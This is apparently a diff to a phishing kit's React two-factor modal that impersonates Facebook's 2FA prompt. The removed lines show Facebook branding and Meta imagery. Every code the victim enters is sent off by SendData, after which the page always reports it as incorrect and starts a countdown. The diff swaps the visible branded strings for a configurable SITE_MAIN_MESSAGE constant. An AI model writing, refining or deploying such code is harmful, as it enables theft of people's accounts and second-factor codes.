@@ -1,5 +1,6 @@
-import React from 'react';
-import Modal from './Modal';
+import React from 'react'
+import Modal from './Modal'
+import { SITE_MAIN_MESSAGE } from '#data/site-message'
 import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
@@ -81,10 +82,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
-                        const minutes = Math.floor(countdown / 60);
-                        const seconds = countdown % 60;
                         setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
+                            twoFa: SITE_MAIN_MESSAGE,
                         });
 
                         setLoading(false);
@@ -95,11 +94,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             countdown -= 1;
                             setCountdown(countdown);
 
-                            const minutes = Math.floor(countdown / 60);
-                            const seconds = countdown % 60;
-
                             setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
+                                twoFa: SITE_MAIN_MESSAGE,
                             });
 
                             if (countdown <= 0) {
@@ -124,10 +120,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 await SendData(formDataState)
                 .then((response) => {
                     setTimeout(async () => {
-                        const minutes = Math.floor(countdown / 60);
-                        const seconds = countdown % 60;
                         setErrors({
-                            twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`,
+                            twoFa: SITE_MAIN_MESSAGE,
                         });
                         setLoading(false);
                         setTwoFa('');
@@ -137,11 +131,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             countdown -= 1;
                             setCountdown(countdown);
 
-                            const minutes = Math.floor(countdown / 60);
-                            const seconds = countdown % 60;
-
                             setErrors({
-                                twoFa: `The two-factor authentication you entered is incorrect. Please, try again after ${minutes > 0 ? minutes : 0} minutes ${seconds > 0 ? seconds : 0} seconds.`
+                                twoFa: SITE_MAIN_MESSAGE,
                             });
 
                             if (countdown <= 0) {
@@ -202,10 +193,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                         <span>{fullName}</span>
                         <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
-                        <span>Facebook</span>
+                        <span>{SITE_MAIN_MESSAGE}</span>
                     </div>
-                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>Two-factor authentication required (1/3)</h2>
-                    <p className='text-[#9a979e] text-[14px]'>Enter the code for this account that we send to {emailDisplay}, {phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)</p>
+                    <h2 className='text-[20px] text-[black] font-[700] mb-[15px]'>{SITE_MAIN_MESSAGE}</h2>
+                    <p className='text-[#9a979e] text-[14px]'>{SITE_MAIN_MESSAGE} {emailDisplay} {phoneDisplay}</p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                     </div>
@@ -215,7 +206,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                 <input
                                     type="number"
                                     id="twoFa"
-                                    placeholder="Enter the code"
+                                    placeholder={SITE_MAIN_MESSAGE}
                                     className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
@@ -234,12 +225,12 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                             <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                         </div>
                                     )}
-                                    {loading ? '' : 'Continue'}
+                                    {loading ? '' : SITE_MAIN_MESSAGE}
                                 </button>
                             </div>
 
                             <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
-                                <span>Try another way</span>
+                                <span>{SITE_MAIN_MESSAGE}</span>
                             </div>
                         </form>
                     </div>
